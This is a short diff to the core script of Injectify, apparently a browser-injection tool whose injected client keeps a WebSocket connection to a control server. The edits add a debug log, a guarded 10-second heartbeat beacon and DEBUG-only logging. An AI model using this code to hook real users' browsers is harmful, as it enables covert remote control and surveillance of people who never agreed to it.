@@ -1,3 +1,4 @@
+console.log(document.currentScript)
 import { Injectify } from '../definitions/core'
 declare let require, process: any
 const ws: WebSocket = (<any>window).ws || (<any>window).i‍// <- invisible space
@@ -199,6 +200,7 @@ ErrorGuard(() => {
               active: false,
               timer: null
             },
+            pinger: null,
             devtools: false,
             websocket: {}
           },
@@ -250,12 +252,14 @@ ErrorGuard(() => {
   /**
    * Debug helpers
    */
+  /// #if DEBUG
   injectify.debugLog(
     'core',
     'warn',
     'Injectify core.ts loaded! => https://github.com/samdenty99/injectify',
     injectify.info
   )
+  /// #endif
 
   /**
    * Window injection
@@ -398,10 +402,11 @@ ErrorGuard(() => {
   })()
 
   /**
-   * Ping the server every 5 seconds to sustain the connection
+   * Ping the server every 10 seconds to sustain the connection
    */
-  clearInterval(window['ping'])
-  window['ping'] = setInterval(() => {
-    injectify.send('heartbeat')
-  }, 10 * 1000)
+  if (!injectify.global.listeners.pinger) {
+    injectify.global.listeners.pinger = setInterval(() => {
+      injectify.send('heartbeat')
+    }, 10 * 1000)
+  }
 }, true)
